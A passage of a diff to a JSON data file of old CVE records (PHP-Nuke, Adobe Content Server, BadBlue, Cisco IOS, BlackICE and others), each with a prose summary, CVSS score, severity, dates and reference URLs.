+      "summary": "PHP-Nuke 7.3, and other products that use the PHP-Nuke codebase such as the Nuke Cops betaNC PHP-Nuke Bundle, OSCNukeLite 3.1, and OSC2Nuke 7x do not properly use the eregi() PHP function with $_SERVER['PHP_SELF'] to identify the calling script, which allows remote attackers to directly access scripts, obtain path information via a PHP error message, and possibly gain access, as demonstrated using an HTTP request that contains the \"admin.php\" string.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-12-31",
+      "published": "2004-06-01",
       "modified": null,
-      "cwe": "CWE-16",
+      "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0020.html",
-        "http://kb.trendmicro.com/solutions/solutionDetail.asp?solutionId=13353",
-        "http://secunia.com/advisories/7881",
-        "http://www.osvdb.org/6181",
-        "http://www.securityfocus.com/bid/6616"
+        "http://archives.neohapsis.com/archives/bugtraq/2004-06/0005.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2004-06/0006.html",
+        "http://marc.info/?l=bugtraq&m=108611606320559&w=2",
+        "http://marc.info/?l=bugtraq&m=108611643614881&w=2",
+        "http://marc.info/?l=bugtraq&m=108662955105757&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1342",
-      "summary": "Trend Micro Virus Control System (TVCS) 1.8 running with IIS allows remote attackers to cause a denial of service (memory consumption) in IIS via multiple URL requests for ActiveSupport.exe.",
+      "id": "CVE-2002-1018",
+      "summary": "The library feature for Adobe Content Server 3.0 does not verify if a customer has already checked out an eBook, which allows remote attackers to cause a denial of service (resource exhaustion) by checking out the same book multiple times.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2003-12-31",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0020.html",
+        "http://marc.info/?l=vuln-dev&m=102649215618643&w=2",
+        "http://marc.info/?l=vuln-dev&m=102650064028760&w=2",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0020.html",
+        "http://marc.info/?l=vuln-dev&m=102649215618643&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1019",
+      "summary": "The library feature for Adobe Content Server 3.0 allows a remote attacker to check out an eBook for an arbitrary length of time via a modified loanMin parameter to download.asp.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0020.html",
+        "http://marc.info/?l=vuln-dev&m=102649215618643&w=2",
+        "http://marc.info/?l=vuln-dev&m=102650064028760&w=2",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0020.html",
+        "http://marc.info/?l=vuln-dev&m=102649215618643&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1020",
+      "summary": "The library feature for Adobe Content Server 3.0 allows a remote attacker to check out an eBook even when the maximum number of loans is exceeded by accessing the \"Add to bookbag\" feature when the server reports that no more copies are available.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0020.html",
+        "http://marc.info/?l=vuln-dev&m=102649215618643&w=2",
+        "http://marc.info/?l=vuln-dev&m=102650064028760&w=2",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0020.html",
+        "http://marc.info/?l=vuln-dev&m=102649215618643&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1021",
+      "summary": "BadBlue server allows remote attackers to read restricted files, such as EXT.INI, via an HTTP request that contains a hex-encoded null byte.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0143.html",
+        "http://www.iss.net/security_center/static/9557.php",
+        "http://www.securityfocus.com/bid/5226",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0143.html",
+        "http://www.iss.net/security_center/static/9557.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1022",
+      "summary": "BadBlue server stores passwords in plaintext in the ext.ini file, which could allow local and possibly remote attackers to gain privileges.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0143.html",
+        "http://www.iss.net/security_center/static/9558.php",
+        "http://www.securityfocus.com/bid/5228",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0143.html",
+        "http://www.iss.net/security_center/static/9558.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1023",
+      "summary": "BadBlue server allows remote attackers to cause a denial of service (crash) via an HTTP GET request without a URI.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0082.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0143.html",
+        "http://www.iss.net/security_center/static/9528.php",
+        "http://www.securityfocus.com/bid/5187",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0082.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1024",
+      "summary": "Cisco IOS 12.0 through 12.2, when supporting SSH, allows remote attackers to cause a denial of service (CPU consumption) via a large packet that was designed to exploit the SSH CRC32 attack detection overflow (CVE-2001-0144).",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2002-10-04",
       "modified": null,
       "cwe": "CWE-399",
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0020.html",
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0021.html",
-        "http://secunia.com/advisories/7881",
-        "http://www.osvdb.org/6185",
-        "http://www.securityfocus.com/bid/6617"
+        "http://www.cisco.com/warp/public/707/SSH-scanning.shtml",
+        "http://www.iss.net/security_center/static/9437.php",
+        "http://www.kb.cert.org/vuls/id/290140",
+        "http://www.securityfocus.com/bid/5114",
+        "http://www.cisco.com/warp/public/707/SSH-scanning.shtml"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0578",
-      "summary": "A Windows NT system's registry audit policy does not log an event success or failure for security-critical registry keys.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1999-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/228",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/228"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0683",
-      "summary": "Directory traversal vulnerability in Carello 1.3 allows remote attackers to execute programs on the server via a .. (dot dot) in the VBEXE parameter.",
-      "cvssScore": 7.5,
+      "id": "CVE-2001-0085",
+      "summary": "Buffer overflow in Kermit communications software in HP-UX 11.0 and earlier allows local users to cause a denial of service and possibly execute arbitrary commands.",
+      "cvssScore": 7.2,
       "severity": "High",
-      "published": "2002-07-23",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0015.html",
-        "http://marc.info/?l=bugtraq&m=102631808212876&w=2",
-        "http://www.iss.net/security_center/static/9521.php",
-        "http://www.osvdb.org/6592",
-        "http://www.securityfocus.com/bid/5192"
+        "http://archives.neohapsis.com/archives/hp/2000-q4/0083.html",
+        "http://www.securityfocus.com/bid/2170",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5793",
+        "http://archives.neohapsis.com/archives/hp/2000-q4/0083.html",
+        "http://www.securityfocus.com/bid/2170"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0685",
-      "summary": "Heap-based buffer overflow in the message decoding functionality for PGP Outlook Encryption Plug-In, as used in NAI PGP Desktop Security 7.0.4, Personal Security 7.0.3, and Freeware 7.0.3, allows remote attackers to modify the heap and gain privileges via a large, malformed mail message.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-07-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://download.nai.com/products/licensed/pgp/desktop_security/windows/version_7.04/hotfix/ReadMe.txt",
-        "http://marc.info/?l=bugtraq&m=102634756815773&w=2",
-        "http://marc.info/?l=ntbugtraq&m=102639521518942&w=2",
-        "http://www.iss.net/security_center/static/9525.php",
-        "http://www.kb.cert.org/vuls/id/821139"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1995",
-      "summary": "Cross-Site Request Forgery (CSRF) vulnerability in FuseTalk 2.0 allows remote attackers to create arbitrary accounts via a link to adduser.cfm.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": "CWE-352",
-      "references": [
-        "http://marc.info/?l=bugtraq&m=108377423825478&w=2",
-        "http://secunia.com/advisories/11555",
-        "http://securitytracker.com/id?1010080",
-        "http://www.osvdb.org/5895",
-        "http://www.securityfocus.com/bid/10276"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1680",
-      "summary": "Cross-site scripting (XSS) vulnerability in CGI Online Worldweb Shopping 1.1 (a.k.a. COWS) allows remote attackers to execute arbitrary script as other users by injecting script into (1) diagnose.cgi or (2) compatible.cgi.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/82/251570",
-        "http://www.securityfocus.com/bid/3914",
-        "http://www.securityfocus.com/bid/3921",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7986",
-        "http://online.securityfocus.com/archive/82/251570"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1681",
-      "summary": "Cross-site scripting (XSS) vulnerability in Slashcode CVS releases June 17 through July 1 2002 allows remote attackers to execute arbitrary script as other users by injecting script into the paragraph <P> tag.",
-      "cvssScore": 6.8,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/280218",
-        "http://online.securityfocus.com/archive/1/280255",
-        "http://www.securityfocus.com/bid/5140",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9473",
-        "http://online.securityfocus.com/archive/1/280218"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1682",
-      "summary": "NewsReactor 1.0 uses a weak encryption scheme, which could allow local users to decrypt the passwords and gain access to other users' newsgroup accounts.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-326",
-      "references": [
-        "http://www.securiteam.com/windowsntfocus/5SP0P0K60C.html",
-        "http://www.securityfocus.com/bid/3927",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7968",
-        "http://www.securiteam.com/windowsntfocus/5SP0P0K60C.html",
-        "http://www.securityfocus.com/bid/3927"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1683",
-      "summary": "Cross-site scripting (XSS) vulnerability in BadBlue Personal Edition 1.7.3 allows remote attackers to execute arbitrary script as other users by injecting script into the cleanSearchString() function.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/281141",
-        "http://www.securityfocus.com/bid/5179",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9514",
-        "http://online.securityfocus.com/archive/1/281141",
-        "http://www.securityfocus.com/bid/5179"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1684",
-      "summary": "Directory traversal vulnerability in (1) Deerfield D2Gfx 1.0.2 or (2) BadBlue Enterprise Edition 1.5.x and BadBlue Personal Edition 1.5.6 allows remote attackers to read arbitrary files via a ../ (dot dot slash) in the script used to read Microsoft Office documents.",
+      "id": "CVE-2001-0086",
+      "summary": "CGI Script Center Subscribe Me LITE 2.0 and earlier allows remote attackers to delete arbitrary mailing list users without authentication by directly calling subscribe.pl with the target address as a parameter.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-12-31",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/archive/1/251523",
-        "http://www.securityfocus.com/bid/3913",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7946",
-        "http://www.securityfocus.com/archive/1/251523",
-        "http://www.securityfocus.com/bid/3913"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0160.html",
+        "http://www.securityfocus.com/bid/2108",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5735",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0160.html",
+        "http://www.securityfocus.com/bid/2108"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1685",
-      "summary": "Cross-site scripting vulnerability (XSS) in BadBlue Enterprise Edition and Personal Edition 1.7 and 1.7.2 allows remote attackers to execute arbitrary script as other users by injecting script into ext.dll ISAPI.",
-      "cvssScore": 4.3,
+      "id": "CVE-2001-0087",
+      "summary": "itetris/xitetris 1.6.2 and earlier trusts the PATH environmental variable to find and execute the gunzip program, which allows local users to gain root privileges by changing their PATH so that it points to a malicious gunzip program.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0295.html",
+        "http://www.securityfocus.com/bid/2139",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5795",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0295.html",
+        "http://www.securityfocus.com/bid/2139"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0093",
+      "summary": "Vulnerability in telnetd in FreeBSD 1.5 allows local users to gain root privileges by modifying critical environmental variables that affect the behavior of telnetd.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2000-017.txt.asc",
+        "ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2000-017.txt.asc"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0094",
+      "summary": "Buffer overflow in kdc_reply_cipher of libkrb (Kerberos 4 authentication library) in NetBSD 1.5 and FreeBSD 4.2 and earlier, as used in Kerberised applications such as telnetd and login, allows local users to gain root privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:25.kerberosIV.asc",
+        "ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2000-017.txt.asc",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5734",
+        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:25.kerberosIV.asc",
+        "ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2000-017.txt.asc"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0095",
+      "summary": "catman in Solaris 2.7 and 2.8 allows local users to overwrite arbitrary files via a symlink attack on the sman_PID temporary file.",
+      "cvssScore": 1.2,
+      "severity": "Low",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0313.html",
+        "http://www.osvdb.org/6024",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5788",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0313.html",
+        "http://www.osvdb.org/6024"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0096",
+      "summary": "FrontPage Server Extensions (FPSE) in IIS 4.0 and 5.0 allows remote attackers to cause a denial of service via a malformed form, aka the \"Malformed Web Form Submission\" vulnerability.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-12-31",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://online.securityfocus.com/archive/1/281088",
-        "http://www.securityfocus.com/bid/5086",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9513",
-        "http://online.securityfocus.com/archive/1/281088",
-        "http://www.securityfocus.com/bid/5086"
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-100",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5823",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-100",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5823"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1686",
-      "summary": "Buffer overflow in lscfg of unknown versions of AIX has unknown impact.",
+      "id": "CVE-2001-0097",
+      "summary": "The Web interface for Infinite Interchange 3.6.1 allows remote attackers to cause a denial of service (application crash) via a large POST request.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/152403",
+        "http://www.securityfocus.com/bid/2140",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5798",
+        "http://www.securityfocus.com/archive/1/152403",
+        "http://www.securityfocus.com/bid/2140"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0098",
+      "summary": "Buffer overflow in Bea WebLogic Server before 5.1.0 allows remote attackers to execute arbitrary commands via a long URL that begins with a \"..\"  string.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2002-12-31",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/aix/2002-q1/0005.html",
-        "http://archives.neohapsis.com/archives/aix/2002-q1/0005.html"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0331.html",
+        "http://www.securityfocus.com/bid/2138",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5782",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0331.html",
+        "http://www.securityfocus.com/bid/2138"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1687",
-      "summary": "Buffer overflow in the diagnostics library in AIX allows local users to \"cause data and instructions to be overwritten\" via a long DIAGNOSTICS environment variable.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/aix/2002-q1/0005.html",
-        "http://archives.neohapsis.com/archives/aix/2002-q1/0005.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1688",
-      "summary": "The browser history feature in Microsoft Internet Explorer 5.5 through 6.0 allows remote attackers to execute arbitrary script as other users and steal authentication information via cookies by injecting JavaScript into the URL, which is executed when the user hits the Back button.",
+      "id": "CVE-2004-1433",
+      "summary": "Multiple versions of Cisco ONS 15327, ONS 15454, and ONS 15454 SDH, including 4.6(0) and 4.6(1), 4.5(x), 4.1(0) to 4.1(3), 4.0(0) to 4.0(2), and earlier versions, and ONS 15600 1.x(x), allows remote attackers to cause a denial of service (control card reset) via malformed (1) TCP and (2) UDP packets.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-12-31",
+      "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://online.securityfocus.com/archive/1/267561",
-        "http://www.securityfocus.com/bid/4505",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8844",
-        "http://online.securityfocus.com/archive/1/267561",
-        "http://www.securityfocus.com/bid/4505"
+        "http://secunia.com/advisories/12117",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040721-ons.shtml",
+        "http://www.kb.cert.org/vuls/id/486224",
+        "http://www.kb.cert.org/vuls/id/800384",
+        "http://www.securityfocus.com/bid/10768"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0397",
-      "summary": "Stack-based buffer overflow during the apr_time_t data conversion in Subversion 1.0.2 and earlier allows remote attackers to execute arbitrary code via a (1) DAV2 REPORT query or (2) get-dated-rev svn-protocol command.",
+      "id": "CVE-1999-0163",
+      "summary": "In older versions of Sendmail, an attacker could use a pipe character to execute root commands.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0163",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0163"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0249",
+      "summary": "Windows NT RSHSVC program allows remote users to execute arbitrary commands.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://www.cve.org/CVERecord?id=CVE-1999-0249",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0249"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0496",
+      "summary": "A Windows NT 4.0 user can gain administrative rights by forcing NtOpenProcessToken to succeed regardless of the user's permissions, aka GetAdmin.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": "CWE-264",
+      "references": [
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ146965",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ146965"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0503",
+      "summary": "A Windows NT local user or administrator account has a guessable password.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0503",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0503"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0100",
+      "summary": "Buffer overflow in Cisco IOS 11.2.x to 12.0.x allows remote attackers to cause a denial of service and possibly execute commands via a large number of OSPF neighbor announcements.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2004-07-07",
+      "published": "2003-03-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-May/021737.html",
-        "http://marc.info/?l=bugtraq&m=108498676517697&w=2",
-        "http://secunia.com/advisories/11642",
-        "http://secunia.com/advisories/11675",
-        "http://security.e-matters.de/advisories/082004.html"
+        "http://marc.info/?l=bugtraq&m=104576100719090&w=2",
+        "http://marc.info/?l=bugtraq&m=104587206702715&w=2",
+        "http://www.iss.net/security_center/static/11373.php",
+        "http://www.securityfocus.com/bid/6895",
+        "http://marc.info/?l=bugtraq&m=104576100719090&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-2126",
-      "summary": "The upgrade for BlackICE PC Protection 3.6 and earlier sets insecure permissions for .INI files such as (1) blackice.ini, (2) firewall.ini, (3) protect.ini, or (4) sigs.ini, which allows local users to modify BlackICE configuration or possibly execute arbitrary code by exploiting vulnerabilities in the .INI parsers.",
+      "id": "CVE-2003-0101",
+      "summary": "miniserv.pl in (1) Webmin before 1.070 and (2) Usermin before 1.000 does not properly handle metacharacters such as line feeds and carriage returns (CRLF) in Base-64 encoded strings during Basic authentication, which allows remote attackers to spoof a session ID and gain root privileges.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2003-03-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/20030602-01-I",
+        "http://archives.neohapsis.com/archives/hp/2003-q1/0063.html",
+        "http://archives.neohapsis.com/archives/linux/engarde/2003-q1/0008.html",
+        "http://marc.info/?l=bugtraq&m=104610245624895&w=2",
+        "http://marc.info/?l=bugtraq&m=104610300325629&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1077",
+      "summary": "Unknown vulnerability in UFS for Solaris 9 for SPARC, with logging enabled, allows local users to cause a denial of service (UFS file system hang).",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2003-03-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/8234/",
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-51300-1",
+        "http://www.securityfocus.com/bid/7032",
+        "http://www.securitytracker.com/id?1006233",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11481"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2118",
+      "summary": "Tiny Server 1.1 allows remote attackers to cause a denial of service (crash) via a GET request with a long filename, possibly due to a buffer overflow.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107496530806730&w=2",
+        "http://secunia.com/advisories/10707",
+        "http://www.autistici.org/fdonato/advisory/tinyServer1.1%5B1.0.5%5D-adv.txt",
+        "http://www.securityfocus.com/bid/9485",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14928"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2119",
+      "summary": "Cross-site scripting (XSS) vulnerability in Tiny Server 1.1 allows remote attackers to inject arbitrary web script or HTML via the URL.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107496530806730&w=2",
+        "http://secunia.com/advisories/10707",
+        "http://www.autistici.org/fdonato/advisory/tinyServer1.1%5B1.0.5%5D-adv.txt",
+        "http://www.osvdb.org/3710",
+        "http://www.securityfocus.com/bid/9485"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2121",
+      "summary": "Multiple directory traversal vulnerabilities in Borland Web Server (BWS) 1.0b3 and earlier allow remote attackers to read and download arbitrary files via (1) multi-dot \"......\" sequences, or (2) \"%5c%2e%2e\" (encoded \"\\..\") sequences, in the URL.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107497413413907&w=2",
+        "http://securitytracker.com/id?1008840",
+        "http://www.securityfocus.com/bid/9486",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14948",
+        "http://marc.info/?l=bugtraq&m=107497413413907&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2123",
+      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in Nextplace.com E-Commerce ASP Engine allow remote attackers to inject arbitrary web script or HTML via the (1) level parameter of productdetail.asp, (2) searchKey parameter of searchresults.asp, and possibly (3) level parameter of ListCategories.asp.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107513601805018&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14952",
+        "http://marc.info/?l=bugtraq&m=107513601805018&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14952"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2124",
+      "summary": "The register_globals simulation capability in Gallery 1.3.1 through 1.4.1 allows remote attackers to modify the HTTP_POST_VARS variable and conduct a PHP remote file inclusion attack via the GALLERY_BASEDIR parameter, a different vulnerability than CVE-2002-1412.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://gallery.menalto.com/modules.php?op=modload&name=News&file=index",
+        "http://marc.info/?l=bugtraq&m=107524414317693&w=2",
+        "http://secunia.com/advisories/10712/",
+        "http://www.gentoo.org/security/en/glsa/glsa-200402-04.xml",
+        "http://www.osvdb.org/3737"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2125",
+      "summary": "Buffer overflow in blackd.exe for BlackICE PC Protection 3.6 and other versions before 3.6.ccb, with application protection off, allows local users to gain system privileges by modifying the .INI file to contain a long packetLog.fileprefix value.",
       "cvssScore": 4.6,
       "severity": "Medium",
       "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
